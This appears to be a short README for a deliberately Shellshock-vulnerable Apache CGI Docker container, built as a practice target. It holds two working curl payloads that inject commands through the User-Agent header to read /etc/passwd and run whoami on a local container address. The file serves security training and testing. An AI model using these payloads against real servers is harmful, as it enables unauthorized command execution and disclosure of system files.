docker-shellshockable
=====================

Docker container with Apache 2 / CGI shellshock vulnerable.
```
docker build -t shellshock docker-shellshockable
docker run -d --name shellshock 6c514587a5ff
export WEBSRV=`docker inspect --format "{{.NetworkSettings.IPAddress}}" shellshock`
curl -A "() { foo;};echo;/bin/cat /etc/passwd" "http://172.17.0.2/cgi-bin/shockme.cgi"
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'whoami'" "http://172.17.0.2/cgi-bin/shockme.cgi"
```
